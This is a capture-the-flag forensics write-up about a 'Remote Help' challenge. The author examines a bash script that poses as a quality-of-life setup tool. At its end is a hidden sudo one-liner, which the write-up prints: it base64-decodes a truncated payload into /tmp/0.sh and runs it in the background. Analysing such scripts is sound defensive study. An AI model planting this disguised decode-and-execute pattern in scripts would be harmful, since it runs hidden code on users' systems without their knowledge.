# DoD Cyber Sentinel Challenge - Remote Help (forensics, 200p, Medium Difficulty) 6/24/2025
## Preface
Unfortunately, I do not have access to the original challenge statement, but it mentions something about a fictional internal attack from a recently hired remote worker. They were able to recover a [bash script](https://github.com/btoroth/QOL/blob/main/QOL.sh) that seems to have triggered alarms, causing the attack to fail. It then mentions to try and follow the cyber kill chain from start to finish to see what the attacker was trying to do, and along the way you'd find four different parts of the flag.

## Solving

![image](https://github.com/user-attachments/assets/710acb2e-cbea-489c-ac08-c4962739b961)

At first glance the script seems pretty harmless, even calling itself a QOL (Quality of Life) script meant to just make some minor improvements to the system. Update/upgrade packages, install some tools, create some aliases, blah blah blah. BUT if you keep scrolling, down at the very bottom we see this:

`sudo echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSI ... AvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d >> /tmp/0.sh && chmod +x /tmp/0.sh && /bin/bash /tmp/0.sh &`
